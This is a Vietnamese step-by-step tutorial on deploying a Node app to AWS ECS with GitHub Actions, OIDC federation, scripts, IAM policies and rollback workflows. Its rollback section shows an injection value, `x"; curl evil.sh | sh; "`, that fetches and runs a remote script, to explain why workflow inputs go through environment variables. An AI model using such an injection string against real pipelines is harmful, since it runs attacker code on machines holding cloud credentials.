# CI/CD thủ công: GitHub Actions → AWS (OIDC) → ECS, không dùng Terraform

Bản này dành cho người muốn **hiểu luồng xử lý**. Mọi thứ đều làm bằng AWS Console, AWS CLI và GitHub UI, không dùng Terraform. Thứ tự làm:

1. **Phần A:** tự deploy bằng tay từ máy mình, từng lệnh một. Mỗi lệnh ở đây về sau thành một step của pipeline.
2. **Phần B:** tạo môi trường production thứ hai.
3. **Phần C:** dựng OIDC trên Console, rồi tự tay "mổ" token OIDC để thấy GitHub và AWS nói chuyện thế nào.
4. **Phần D:** viết pipeline. Pipeline chỉ chạy lại đúng các lệnh ở Phần A, trên máy của GitHub, bằng credential tạm.

Điều kiện: đã dựng xong hạ tầng theo [DEPLOY_CONSOLE.md](../DEPLOY_CONSOLE.md). Bản dùng Terraform của cùng nội dung: [CICD_GITHUB_ACTIONS.md](CICD_GITHUB_ACTIONS.md).

Khớp với lộ trình tuần 4:

| Ngày | Phần trong tài liệu này |
|---|---|
| T2 Workflow CI | D1 |
| T3 Unit test, bảo vệ main | D2 (phần viết test xem [CICD_GITHUB_ACTIONS.md – Ngày 2](CICD_GITHUB_ACTIONS.md#ngày-2--unit-test-và-bảo-vệ-nhánh-main)) |
| T4 GitHub → AWS qua OIDC | C |
| T5 Build và push image | A1–A2, D3 |
| T6 Staging, duyệt production, rollback | A3–A5, B, D4–D6 |

---

## Tên tài nguyên dùng trong tài liệu

| | Staging (đã có từ DEPLOY_CONSOLE) | Production (tạo ở Phần B) |
|---|---|---|
| ECS cluster | `demo-api-cluster` | `demo-api-cluster` (dùng chung) |
| ECS service | `demo-api-service` | `demo-api-prod-service` |
| Task definition family | `demo-api-task` | `demo-api-prod-task` |
| Target group | `demo-api-tg` | `demo-api-prod-tg` |
| ALB | `demo-api-alb`, cổng **80** | `demo-api-alb`, cổng **8080** |
| ECR repo | `demo-api` (dùng chung, một image chạy cả 2 nơi) | ← |
| Execution role | `ecsTaskExecutionRole` | ← |

Region: `ap-southeast-1`. Thay `<ACCOUNT_ID>` bằng account của bạn (`aws sts get-caller-identity`).

---

## Phần A — Deploy bằng tay để thấy từng bước

Một lần deploy lên ECS thực chất chỉ gồm 6 việc:

```
① build image ─► ② push ECR (tag = commit SHA) ─► ③ lấy task definition đang chạy
   ─► ④ thay image, đăng ký revision mới ─► ⑤ update service, ECS rolling update
   ─► ⑥ chờ ổn định + smoke test (/version phải trả đúng SHA)
```

Chạy các lệnh dưới bằng **Git Bash**. Cần thêm `jq` (`winget install jqlang.jq`, mở lại terminal).

### A1. Cho app biết nó đang chạy commit nào

Thêm endpoint `/version` trong [src/index.ts](../src/index.ts), đặt cạnh `/health`:

```ts
app.get("/version", (_req, res) => {
  res.json({ sha: process.env.GIT_SHA ?? "dev" });
});
```

Trong [Dockerfile](../Dockerfile), stage thứ hai (runtime), thêm ngay sau `ENV NODE_ENV=production`:

```dockerfile
ARG GIT_SHA=dev
ENV GIT_SHA=$GIT_SHA
```

Commit thay đổi này: `git commit -am "add /version"`.

> SHA được "nướng" vào image. Deploy image nào thì `/version` trả SHA của image đó. Đây là cách duy nhất biết chắc chắn đang chạy code gì.

### A2. Build và push image tag theo commit SHA

```bash
REGION=ap-southeast-1
ACCOUNT=$(aws sts get-caller-identity --query Account --output text | tr -d '\r')
REGISTRY=$ACCOUNT.dkr.ecr.$REGION.amazonaws.com
SHA=$(git rev-parse HEAD)
IMAGE=$REGISTRY/demo-api:$SHA
echo $IMAGE

aws ecr get-login-password --region $REGION | docker login --username AWS --password-stdin $REGISTRY
docker build --build-arg GIT_SHA=$SHA -t $IMAGE .
docker push $IMAGE
```

(`tr -d '\r'`: AWS CLI trên Windows trả về ký tự xuống dòng kiểu CRLF, phải bỏ `\r` đi thì biến mới dùng được.)

Quan sát: **ECR → Repositories → demo-api** có thêm một image với tag là chuỗi 40 ký tự.

Vì sao không dùng `latest`? `latest` là nhãn di động, nay trỏ image A, mai trỏ image B. Với SHA, mỗi tag gắn đúng một commit, nên luôn biết đang chạy gì và có chỗ để quay về. Nên bật **ECR → demo-api → Edit → Tag immutability: Enabled** để một tag đã push thì không ai ghi đè được.

### A3. Hiểu task definition và revision

Task definition là "bản mô tả container": image, CPU/RAM, biến môi trường, secret, role, log. Bạn không sửa được một revision đã đăng ký, chỉ đăng ký **revision mới**.

```bash
aws ecs describe-task-definition --task-definition demo-api-task \
  --query 'taskDefinition.{family:family,revision:revision,image:containerDefinitions[0].image}'
```

Mở Console **ECS → Task definitions → demo-api-task** để thấy danh sách revision 1, 2, 3…

### A4. Script deploy: `scripts/deploy-ecs.sh`

Tạo file này. Pipeline ở Phần D sẽ gọi **đúng script này**, nên chạy được bằng tay là pipeline cũng chạy được.

```bash
#!/usr/bin/env bash
# Deploy một image lên một ECS service bằng cách tạo task definition revision mới.
# Usage: scripts/deploy-ecs.sh <cluster> <service> <task-family> <image-uri>
set -euo pipefail

CLUSTER="$1"; SERVICE="$2"; FAMILY="$3"; IMAGE="$4"
WORK=.deploy
mkdir -p "$WORK"
txt() { aws "$@" --output text | tr -d '\r'; }

echo "① Lấy task definition mới nhất của family $FAMILY"
aws ecs describe-task-definition --task-definition "$FAMILY" --query taskDefinition --output json > "$WORK/td-current.json"
echo "   hiện tại: $FAMILY:$(jq -r .revision "$WORK/td-current.json")"
echo "   image   : $(jq -r '.containerDefinitions[] | select(.name=="app") | .image' "$WORK/td-current.json")"

echo "② Thay image của container 'app', bỏ các field chỉ đọc mà API register không nhận"
jq --arg IMG "$IMAGE" '
  .containerDefinitions |= map(if .name == "app" then .image = $IMG else . end)
  | del(.taskDefinitionArn, .revision, .status, .requiresAttributes,
        .compatibilities, .registeredAt, .registeredBy, .deregisteredAt)
' "$WORK/td-current.json" > "$WORK/td-new.json"

echo "③ Đăng ký revision mới"
NEW_TD=$(txt ecs register-task-definition --cli-input-json "file://$WORK/td-new.json" \
           --query taskDefinition.taskDefinitionArn)
echo "   => $NEW_TD"

echo "④ Trỏ service sang revision mới (ECS bắt đầu rolling update)"
aws ecs update-service --cluster "$CLUSTER" --service "$SERVICE" --task-definition "$NEW_TD" \
  --query 'service.deployments[0].{status:status,rollout:rolloutState,td:taskDefinition}' --output table

echo "⑤ Chờ service ổn định (tối đa ~10 phút)"
aws ecs wait services-stable --cluster "$CLUSTER" --services "$SERVICE"

echo "⑥ Xác nhận service đang chạy đúng revision vừa tạo"
CURRENT=$(txt ecs describe-services --cluster "$CLUSTER" --services "$SERVICE" \
            --query 'services[0].taskDefinition')
if [ "$CURRENT" != "$NEW_TD" ]; then
  echo "::error::Service đang chạy $CURRENT thay vì $NEW_TD, circuit breaker đã rollback"
  exit 1
fi
echo "Deploy xong: $NEW_TD"
```

Thêm `.deploy/` vào [.gitignore](../.gitignore).

Bước ⑥ cần vì nếu task mới hỏng, **circuit breaker** (bật ở B4) đưa service về revision cũ. Lúc đó service vẫn "ổn định", nhưng là ổn định trên bản cũ. Nếu chỉ chờ ổn định, ta tưởng deploy thành công.

### A5. Script smoke test: `scripts/smoke-test.sh`

```bash
#!/usr/bin/env bash
# Usage: scripts/smoke-test.sh <base-url> <expected-sha>
set -euo pipefail
URL="$1"; EXPECTED="$2"

for i in $(seq 1 20); do
  got=$(curl -fsS "$URL/version" | jq -r .sha | tr -d '\r') || got=""
  [ "$got" = "$EXPECTED" ] && break
  echo "lần $i: /version='$got', chờ ALB chuyển hết sang task mới..."
  sleep 6
done
[ "$got" = "$EXPECTED" ] || { echo "::error::/version trả '$got', mong đợi '$EXPECTED'"; exit 1; }

curl -fsS "$URL/health"; echo
echo "Smoke test OK: $EXPECTED"
```

Phải lặp chờ vì ngay sau khi deploy, ALB có thể vẫn gửi một phần request tới task cũ đang draining.

### A6. Chạy thử deploy bằng tay lên staging

```bash
chmod +x scripts/*.sh
ALB=http://<DNS của demo-api-alb>

./scripts/deploy-ecs.sh demo-api-cluster demo-api-service demo-api-task $IMAGE
./scripts/smoke-test.sh $ALB $SHA
```

**Trong lúc script chạy, mở Console để thấy ECS làm gì:**

| Ở đâu | Bạn sẽ thấy |
|---|---|
| ECS → demo-api-cluster → demo-api-service → **Deployments** | 2 deployment: `PRIMARY` (revision mới, IN_PROGRESS) và `ACTIVE` (revision cũ) |
| Tab **Events** | `has started 1 tasks` → `registered 1 targets in target-group` → `has stopped 1 running tasks` → `has reached a steady state` |
| EC2 → Target groups → demo-api-tg → **Targets** | IP task mới `initial` → `healthy`, IP task cũ `draining` rồi biến mất |
| Tab **Tasks** | Task mới RUNNING, task cũ STOPPED |

Đây chính là **rolling update**: chạy bản mới trước, đợi ALB health check `/health` pass, rồi mới tắt bản cũ. Người dùng không bị gián đoạn.

### A7. Rollback bằng tay

Rollback **không phải** "hoàn tác". Đó chỉ là deploy lại một image cũ:

```bash
OLD_SHA=<sha cũ, lấy từ git log hoặc danh sách tag trong ECR>
./scripts/deploy-ecs.sh demo-api-cluster demo-api-service demo-api-task $REGISTRY/demo-api:$OLD_SHA
./scripts/smoke-test.sh $ALB $OLD_SHA
```

Cách nhanh hơn: trỏ service về một revision cũ sẵn có, không cần đăng ký revision mới:

```bash
aws ecs update-service --cluster demo-api-cluster --service demo-api-service --task-definition demo-api-task:<revision cũ>
```

> Tự trả lời trước khi qua Phần B: 6 bước trên cần những quyền IAM nào? Đáp án ở mục C3.

---

## Phần B — Tạo môi trường production (Console)

Để tiết kiệm, production dùng chung ALB (khác cổng), chung cluster và chung RDS với staging.

> **Lưu ý:** chung RDS nghĩa là dữ liệu chưa tách thật. Nếu tuần 3 bạn đã có môi trường production riêng thì bỏ qua B1–B3, chỉ cần bật B4 cho nó. Muốn tách DB, làm lại bước 3 của DEPLOY_CONSOLE để có một RDS riêng, rồi sửa `DB_HOST` và secret trong task definition production.

### B1. Target group `demo-api-prod-tg`

**EC2 → Target groups → Create target group**

- Target type: **IP addresses**, name `demo-api-prod-tg`, protocol HTTP, port `3000`, VPC `demo-api-vpc`
- Health check path: `/health`
- Next → không đăng ký target nào (ECS tự làm) → Create

Sau đó, ở **cả hai** target group `demo-api-tg` và `demo-api-prod-tg`: vào **Attributes → Edit → Deregistration delay = 30 seconds**. Mặc định là 300s, nên mỗi lần deploy phải chờ thêm 5 phút để task cũ draining.

### B2. Mở cổng 8080 trên ALB

1. **EC2 → Security groups → demo-api-alb-sg → Edit inbound rules → Add rule:** Custom TCP `8080`, source `0.0.0.0/0`.
2. **EC2 → Load balancers → demo-api-alb → Listeners → Add listener:** HTTP `8080` → Forward to `demo-api-prod-tg`.

### B3. Task definition và service production

Tạo family `demo-api-prod-task` bằng cách copy từ staging (dùng lại mẹo jq ở A4, chỉ đổi `family`):

```bash
aws ecs describe-task-definition --task-definition demo-api-task --query taskDefinition --output json \
 | jq '.family = "demo-api-prod-task"
       | del(.taskDefinitionArn,.revision,.status,.requiresAttributes,.compatibilities,.registeredAt,.registeredBy,.deregisteredAt)' \
 > .deploy/td-prod.json
aws ecs register-task-definition --cli-input-json file://.deploy/td-prod.json --query taskDefinition.taskDefinitionArn
```

(Cách làm bằng Console: **Task definitions → Create new task definition with JSON**, dán nội dung `td-prod.json`.)

**ECS → demo-api-cluster → Services → Create**

- Launch type Fargate · Task definition family `demo-api-prod-task` (latest) · Service name `demo-api-prod-service` · Desired tasks 1
- Networking: VPC `demo-api-vpc`, 2 **public** subnet, SG `demo-api-ecs-sg`, Public IP **On** (giống service staging)
- Load balancing: Application Load Balancer → existing `demo-api-alb` → listener **8080** → target group existing `demo-api-prod-tg`
- **Deployment options → Deployment failure detection:** tick **Use the Amazon ECS deployment circuit breaker** + **Rollback on failure**

Kiểm tra: `curl http://<ALB>:8080/version`.

### B4. Bật circuit breaker cho staging

**demo-api-service → Update service → Deployment options:** tick circuit breaker + rollback on failure → Update.

Circuit breaker theo dõi lần deploy: nếu task mới liên tục chết hoặc fail health check, ECS dừng deploy và tự quay về revision trước. Đây là tầng rollback tự động đầu tiên.

---

## Phần C — OIDC: cho GitHub vào AWS mà không cần access key

### C1. Vì sao không dán access key vào GitHub Secrets?

Access key là credential **dài hạn**. Lộ một lần (log, fork, workflow độc hại) là dùng được mãi, từ bất kỳ đâu, đến khi có người phát hiện và thu hồi. OIDC thay key bằng **giấy tờ tuỳ thân có hạn vài phút** do GitHub ký. AWS kiểm tra giấy tờ đó rồi cấp credential tạm (≤1 giờ). GitHub không lưu bí mật nào.

```
GitHub runner            GitHub OIDC provider         AWS STS                     IAM role
 │ 1. xin ID token ────────────►│                         │                            │
 │◄──── 2. JWT đã ký (sub, aud) │                         │                            │
 │ 3. AssumeRoleWithWebIdentity(role, JWT) ──────────────►│                            │
 │                              │◄── 4. lấy public key ───┤ kiểm chữ ký, hạn dùng      │
 │                              │                         │ 5. so aud/sub ────────────►│ trust policy
 │◄──────────── 6. AccessKey + Secret + SessionToken (tạm) ┤                            │
```

### C2. Tạo Identity provider

**IAM → Identity providers → Add provider**

- Provider type: **OpenID Connect**
- Provider URL: `https://token.actions.githubusercontent.com`
- Audience: `sts.amazonaws.com`
- Add provider

Từ giờ AWS tin các token do GitHub Actions ký. Mỗi account chỉ cần làm việc này một lần.

### C3. Tạo role `github-actions-demo-api`

**IAM → Roles → Create role → Web identity**

- Identity provider: `token.actions.githubusercontent.com`, Audience: `sts.amazonaws.com`
- GitHub organization: `namnt2211`, repository: `demo-api-ecs`, branch: `main`
- Bỏ qua bước gắn policy → Role name `github-actions-demo-api` → Create

**Sửa trust policy** (tab *Trust relationships → Edit trust policy*). Đây là câu hỏi **AI được đội chiếc mũ này?**

```json
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Principal": {
        "Federated": "arn:aws:iam::<ACCOUNT_ID>:oidc-provider/token.actions.githubusercontent.com"
      },
      "Action": "sts:AssumeRoleWithWebIdentity",
      "Condition": {
        "StringEquals": {
          "token.actions.githubusercontent.com:aud": "sts.amazonaws.com",
          "token.actions.githubusercontent.com:sub": [
            "repo:namnt2211/demo-api-ecs:ref:refs/heads/main",
            "repo:namnt2211/demo-api-ecs:environment:staging",
            "repo:namnt2211/demo-api-ecs:environment:production"
          ]
        }
      }
    }
  ]
}
```

Vì sao có 3 giá trị `sub`? Job thường chạy trên main gửi `sub = ...:ref:refs/heads/main`. Nhưng job có khai báo `environment:` thì GitHub gửi `sub = ...:environment:<tên>`, **không còn** thông tin nhánh. Console chỉ sinh sẵn dạng nhánh, nên phải tự thêm 2 dòng environment.

**Thêm permission policy** (tab *Permissions → Add permissions → Create inline policy → JSON*, đặt tên `deploy-demo-api`). Đây là câu hỏi **đội mũ rồi được LÀM GÌ?** Mỗi statement khớp với một bước ở Phần A:

```json
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Sid": "A2EcrLogin",
      "Effect": "Allow",
      "Action": "ecr:GetAuthorizationToken",
      "Resource": "*"
    },
    {
      "Sid": "A2EcrPushOneRepo",
      "Effect": "Allow",
      "Action": [
        "ecr:BatchCheckLayerAvailability", "ecr:InitiateLayerUpload", "ecr:UploadLayerPart",
        "ecr:CompleteLayerUpload", "ecr:PutImage", "ecr:BatchGetImage", "ecr:DescribeImages"
      ],
      "Resource": "arn:aws:ecr:ap-southeast-1:<ACCOUNT_ID>:repository/demo-api"
    },
    {
      "Sid": "A4TaskDefinition",
      "Effect": "Allow",
      "Action": ["ecs:DescribeTaskDefinition", "ecs:RegisterTaskDefinition"],
      "Resource": "*"
    },
    {
      "Sid": "A4UpdateTwoServices",
      "Effect": "Allow",
      "Action": ["ecs:UpdateService", "ecs:DescribeServices"],
      "Resource": [
        "arn:aws:ecs:ap-southeast-1:<ACCOUNT_ID>:service/demo-api-cluster/demo-api-service",
        "arn:aws:ecs:ap-southeast-1:<ACCOUNT_ID>:service/demo-api-cluster/demo-api-prod-service"
      ]
    },
    {
      "Sid": "A4PassExecutionRole",
      "Effect": "Allow",
      "Action": "iam:PassRole",
      "Resource": "arn:aws:iam::<ACCOUNT_ID>:role/ecsTaskExecutionRole",
      "Condition": { "StringEquals": { "iam:PassedToService": "ecs-tasks.amazonaws.com" } }
    }
  ]
}
```

- `GetAuthorizationToken`, `DescribeTaskDefinition`, `RegisterTaskDefinition` không hỗ trợ giới hạn theo resource, nên phải để `*`.
- **`iam:PassRole`**: task definition mới tham chiếu `ecsTaskExecutionRole`, nghĩa là "giao" role đó cho ECS. Nếu cho PassRole mọi role, pipeline có thể gắn một role admin vào task để mượn quyền. Vì vậy chỉ cho đúng 1 role, và chỉ khi giao cho `ecs-tasks`.
- Không có quyền xoá, không đụng RDS, VPC hay IAM khác.

Copy **ARN của role** (`arn:aws:iam::<ACCOUNT_ID>:role/github-actions-demo-api`).

### C4. Khai báo biến trên GitHub

**Repo → Settings → Secrets and variables → Actions → tab Variables → New repository variable**

| Name | Value |
|---|---|
| `AWS_ROLE_ARN` | `arn:aws:iam::<ACCOUNT_ID>:role/github-actions-demo-api` |
| `AWS_REGION` | `ap-southeast-1` |
| `ECR_REPOSITORY` | `demo-api` |

Để ở **Variables**, không phải Secrets: ARN không phải bí mật, và credential thật không bao giờ nằm ở GitHub. Tab Secrets phải **trống** mọi thứ liên quan AWS.

### C5. Tự tay "mổ" luồng OIDC: `.github/workflows/oidc-debug.yml`

Workflow này làm **bằng lệnh thô** đúng những gì action `configure-aws-credentials` làm ngầm, để bạn thấy từng bước:

```yaml
name: OIDC debug
on: workflow_dispatch

permissions:
  id-token: write      # thiếu dòng này, GitHub không cấp biến ACTIONS_ID_TOKEN_REQUEST_*
  contents: read

jobs:
  debug:
    runs-on: ubuntu-latest
    steps:
      - name: "Bước 1-2: xin ID token (JWT) từ GitHub, in phần claims"
        run: |
          TOKEN=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
                  "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=sts.amazonaws.com" | jq -r .value)
          echo "::add-mask::$TOKEN"          # không bao giờ in token ra log
          echo "$TOKEN" > token.jwt

          # JWT = header.payload.signature (base64url). Giải mã phần payload để xem claims.
          p=$(cut -d. -f2 token.jwt | tr '_-' '/+')
          while [ $(( ${#p} % 4 )) -ne 0 ]; do p="$p="; done
          echo "$p" | base64 -d | jq '{iss, aud, sub, repository, ref, environment, iat, exp}'

      - name: "Bước 3-6: tự gọi STS AssumeRoleWithWebIdentity"
        run: |
          CREDS=$(aws sts assume-role-with-web-identity \
                    --role-arn "${{ vars.AWS_ROLE_ARN }}" \
                    --role-session-name "debug-${{ github.run_id }}" \
                    --web-identity-token "file://token.jwt" \
                    --duration-seconds 900)
          export AWS_ACCESS_KEY_ID=$(echo "$CREDS" | jq -r .Credentials.AccessKeyId)
          export AWS_SECRET_ACCESS_KEY=$(echo "$CREDS" | jq -r .Credentials.SecretAccessKey)
          export AWS_SESSION_TOKEN=$(echo "$CREDS" | jq -r .Credentials.SessionToken)
          echo "::add-mask::$AWS_SECRET_ACCESS_KEY"
          echo "::add-mask::$AWS_SESSION_TOKEN"
          echo "Credential hết hạn lúc: $(echo "$CREDS" | jq -r .Credentials.Expiration)"
          aws sts get-caller-identity
```

Chạy: **Actions → OIDC debug → Run workflow** (nhánh `main`). Đọc log:

- Bước 1-2 in ra claims, ví dụ `"sub": "repo:namnt2211/demo-api-ecs:ref:refs/heads/main"`, `"aud": "sts.amazonaws.com"`, `exp` chỉ cách `iat` vài phút.
- Bước 3-6 in ra `"Arn": "arn:aws:sts::<ACCOUNT_ID>:assumed-role/github-actions-demo-api/debug-..."`. Không có access key nào được lưu ở đâu cả.

**Thí nghiệm phủ định (bắt buộc):** tạo nhánh `test-oidc`, push, rồi Run workflow trên nhánh đó. Bước 1-2 vẫn chạy, `sub` là `...:ref:refs/heads/test-oidc`. Bước 3 bị từ chối với `AccessDenied: Not authorized to perform sts:AssumeRoleWithWebIdentity`. Trust policy đã chặn đúng.

Sau khi hiểu rồi, các workflow thật dùng action thay cho 2 step trên:

```yaml
- uses: aws-actions/configure-aws-credentials@v4
  with:
    role-to-assume: ${{ vars.AWS_ROLE_ARN }}
    aws-region: ${{ vars.AWS_REGION }}
```

---

## Phần D — Viết pipeline (chạy lại Phần A trên máy GitHub)

### D1. CI cho mỗi PR: `.github/workflows/ci.yml`

```yaml
name: CI
on:
  pull_request:
    branches: [main]
  workflow_call:            # để deploy.yml gọi lại

permissions:
  contents: read            # CI không có quyền AWS

jobs:
  build-test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with:
          node-version: 20
          cache: npm
      - run: npm ci
      - run: npm run build
      - run: npm test --if-present
      - run: docker build -t demo-api:ci .
```

Mở một PR bất kỳ để thấy check **build-test** chạy. Viết unit test theo [CICD_GITHUB_ACTIONS.md – Ngày 2](CICD_GITHUB_ACTIONS.md#ngày-2--unit-test-và-bảo-vệ-nhánh-main). Khi đã có script `test` thì bỏ `--if-present`.

### D2. Bảo vệ nhánh main (GitHub UI)

**Settings → Rules → Rulesets → New branch ruleset**, target `main`:

- Restrict deletions, Block force pushes
- Require a pull request before merging → 1 approval
- Require status checks to pass → thêm `build-test`

Kiểm tra: `git push origin main` bị từ chối. (Repo private trên tài khoản Free không bật được ruleset.)

### D3. Environments (GitHub UI)

**Settings → Environments → New environment**

| | `staging` | `production` |
|---|---|---|
| Required reviewers | không | 1–2 người |
| Deployment branches and tags | Selected: `main` | Selected: `main` |
| Variable `ECS_CLUSTER` | `demo-api-cluster` | `demo-api-cluster` |
| Variable `ECS_SERVICE` | `demo-api-service` | `demo-api-prod-service` |
| Variable `ECS_TASK_FAMILY` | `demo-api-task` | `demo-api-prod-task` |
| Variable `APP_URL` | `http://<ALB DNS>` | `http://<ALB DNS>:8080` |

Một environment làm 3 việc: chặn job chờ người duyệt; cấp biến riêng cho từng môi trường; đổi claim `sub` thành `environment:<tên>` (lý do trust policy ở C3 có 2 dòng environment).

### D4. Pipeline deploy: `.github/workflows/deploy.yml`

Đối chiếu từng job với Phần A:

```yaml
name: Deploy
on:
  push:
    branches: [main]

permissions:
  contents: read
  id-token: write

concurrency:
  group: deploy-main
  cancel-in-progress: false

jobs:
  ci:
    uses: ./.github/workflows/ci.yml          # test fail → dừng, không build image

  build-push:                                 # = Phần A2
    needs: ci
    runs-on: ubuntu-latest
    outputs:
      image: ${{ steps.push.outputs.image }}
    steps:
      - uses: actions/checkout@v4
      - uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: ${{ vars.AWS_ROLE_ARN }}
          aws-region: ${{ vars.AWS_REGION }}
          mask-aws-account-id: false          # để output 'image' (chứa account id) truyền sang job sau
      - id: push
        run: |
          ACCOUNT=$(aws sts get-caller-identity --query Account --output text)
          REGISTRY=$ACCOUNT.dkr.ecr.${{ vars.AWS_REGION }}.amazonaws.com
          IMAGE=$REGISTRY/${{ vars.ECR_REPOSITORY }}:$GITHUB_SHA
          aws ecr get-login-password | docker login --username AWS --password-stdin "$REGISTRY"
          docker build --build-arg GIT_SHA=$GITHUB_SHA -t "$IMAGE" .
          docker push "$IMAGE"
          echo "image=$IMAGE" >> "$GITHUB_OUTPUT"

  deploy-staging:                             # = Phần A6, tự động
    needs: build-push
    runs-on: ubuntu-latest
    environment:
      name: staging
      url: ${{ vars.APP_URL }}
    steps:
      - uses: actions/checkout@v4             # cần để có scripts/
      - uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: ${{ vars.AWS_ROLE_ARN }}
          aws-region: ${{ vars.AWS_REGION }}
      - run: bash scripts/deploy-ecs.sh "${{ vars.ECS_CLUSTER }}" "${{ vars.ECS_SERVICE }}" "${{ vars.ECS_TASK_FAMILY }}" "${{ needs.build-push.outputs.image }}"
      - run: bash scripts/smoke-test.sh "${{ vars.APP_URL }}" "$GITHUB_SHA"

  deploy-production:                          # = Phần A6, sau khi có người duyệt
    needs: [build-push, deploy-staging]
    runs-on: ubuntu-latest
    environment:
      name: production                        # ⏸ job dừng "Waiting for review" ở đây
      url: ${{ vars.APP_URL }}
    steps:
      - uses: actions/checkout@v4
      - uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: ${{ vars.AWS_ROLE_ARN }}
          aws-region: ${{ vars.AWS_REGION }}
      - run: bash scripts/deploy-ecs.sh "${{ vars.ECS_CLUSTER }}" "${{ vars.ECS_SERVICE }}" "${{ vars.ECS_TASK_FAMILY }}" "${{ needs.build-push.outputs.image }}"
      - run: bash scripts/smoke-test.sh "${{ vars.APP_URL }}" "$GITHUB_SHA"
```

Điểm cần thấy:

- **Mỗi job là một máy mới.** Job sau không có file của job trước, nên image URI phải truyền qua `outputs`, còn script phải `checkout` lại.
- **Build một lần.** Production dùng đúng URI image staging vừa chạy, không build lại.
- Staging và production chạy **cùng một script**, chỉ khác biến của environment.
- Runner `ubuntu-latest` có sẵn `aws`, `jq`, `docker`, `curl`.

### D5. Rollback: `.github/workflows/rollback.yml`

```yaml
name: Rollback
on:
  workflow_dispatch:
    inputs:
      environment:
        type: choice
        options: [staging, production]
        required: true
      sha:
        description: "Commit SHA đầy đủ (40 ký tự) của bản muốn quay về"
        type: string
        required: true

permissions:
  contents: read
  id-token: write

jobs:
  rollback:
    runs-on: ubuntu-latest
    environment:
      name: ${{ inputs.environment }}       # production vẫn cần duyệt
      url: ${{ vars.APP_URL }}
    env:
      SHA: ${{ inputs.sha }}                 # input đi qua env, KHÔNG nhét ${{ }} thẳng vào script
    steps:
      - uses: actions/checkout@v4
      - uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: ${{ vars.AWS_ROLE_ARN }}
          aws-region: ${{ vars.AWS_REGION }}
      - name: Kiểm tra SHA và image tồn tại
        run: |
          [[ "$SHA" =~ ^[0-9a-f]{40}$ ]] || { echo "::error::SHA không hợp lệ"; exit 1; }
          aws ecr describe-images --repository-name "${{ vars.ECR_REPOSITORY }}" --image-ids imageTag="$SHA" > /dev/null \
            || { echo "::error::ECR không có image tag $SHA"; exit 1; }
      - name: Deploy lại image cũ (= Phần A7)
        run: |
          ACCOUNT=$(aws sts get-caller-identity --query Account --output text)
          IMAGE=$ACCOUNT.dkr.ecr.${{ vars.AWS_REGION }}.amazonaws.com/${{ vars.ECR_REPOSITORY }}:$SHA
          bash scripts/deploy-ecs.sh "${{ vars.ECS_CLUSTER }}" "${{ vars.ECS_SERVICE }}" "${{ vars.ECS_TASK_FAMILY }}" "$IMAGE"
      - run: bash scripts/smoke-test.sh "${{ vars.APP_URL }}" "$SHA"
```

**Vì sao đưa input qua `env`?** Nếu viết `run: echo ${{ inputs.sha }}`, GitHub chép nguyên văn chuỗi người dùng nhập vào script trước khi chạy. Nhập `x"; curl evil.sh | sh; "` là chạy được lệnh tuỳ ý trên một máy **đang giữ credential AWS**. Qua `env` + `"$SHA"`, chuỗi chỉ là dữ liệu. Regex kiểm tra thêm một lớp.

### D6. Diễn tập mốc tuần 4 (bấm giờ, ghi vào log)

1. Tạo PR nhỏ → CI xanh → merge. Theo dõi **Actions → Deploy**: `ci` → `build-push` → `deploy-staging` → `deploy-production` (Waiting for review). Đo thời gian đến khi `curl $STAGING/version` trả SHA mới (< 15 phút).
2. Bấm **Review deployments → Approve** → production lên đúng image đó.
3. Tạo PR làm `/health` trả 500 → merge → pipeline **đỏ ở staging** (task không qua health check, circuit breaker rollback, bước ⑥ của script fail). Job production không chạy.
4. **Actions → Rollback → Run workflow**: `production` + SHA của bản trước → Approve → bấm giờ đến khi `/version` production trả SHA cũ (< 10 phút).

---

## Bảng đối chiếu: làm tay ↔ pipeline ↔ AWS API

| Phần A (tay) | Pipeline | AWS API được gọi | Quyền IAM |
|---|---|---|---|
| `aws configure` (key cá nhân) | `configure-aws-credentials` (OIDC) | `sts:AssumeRoleWithWebIdentity` | Trust policy |
| A2 `docker login` | build-push | `ecr:GetAuthorizationToken` | A2EcrLogin |
| A2 `docker push` | build-push | `ecr:PutImage`, upload layer… | A2EcrPushOneRepo |
| A4 ① | deploy-ecs.sh | `ecs:DescribeTaskDefinition` | A4TaskDefinition |
| A4 ③ | deploy-ecs.sh | `ecs:RegisterTaskDefinition` + `iam:PassRole` | A4TaskDefinition, A4PassExecutionRole |
| A4 ④–⑥ | deploy-ecs.sh | `ecs:UpdateService`, `ecs:DescribeServices` | A4UpdateTwoServices |
| A5 | smoke-test.sh | — (HTTP qua ALB) | — |
| A7 | rollback.yml | như A4 + `ecr:DescribeImages` | như trên |

## Xử lý lỗi thường gặp

| Lỗi | Nguyên nhân | Cách sửa |
|---|---|---|
| `Could not get ID token` / thiếu `ACTIONS_ID_TOKEN_REQUEST_URL` | Thiếu `permissions: id-token: write` | Thêm vào workflow. Workflow được gọi bằng `uses:` cũng cần workflow gọi cấp quyền này |
| `Not authorized to perform sts:AssumeRoleWithWebIdentity` | `sub` không khớp trust policy | Chạy `oidc-debug.yml` xem `sub` thật; job có `environment:` thì `sub` đổi dạng |
| `AccessDenied ... iam:PassRole` | Task definition dùng role khác `ecsTaskExecutionRole` (ví dụ có task role) | Thêm ARN role đó vào statement PassRole |
| `register-task-definition`: `Unknown parameter` | Còn field chỉ đọc trong JSON | Bổ sung tên field vào `del(...)` của jq |
| `Waiter ServicesStable failed: Max attempts exceeded` | Task mới không healthy, đang thử lại | Xem tab Events của service, log CloudWatch `/ecs/demo-api-task`, health của target group |
| Bước ⑥: service đang chạy revision cũ | Circuit breaker đã rollback | Đúng như thiết kế. Xem lý do task chết trong tab Tasks → Stopped |
| `Skip output 'image' since it may contain secret` | Account ID bị mask | `mask-aws-account-id: false` ở job build-push |
| Smoke test trả SHA cũ mãi | Deregistration delay 300s, ALB còn gửi tới task cũ | Đặt 30s (B1) |
| `$'\r': command not found` khi chạy script | File `.sh` bị lưu CRLF trên Windows | `git config core.autocrlf input` hoặc thêm `*.sh text eol=lf` vào `.gitattributes` |
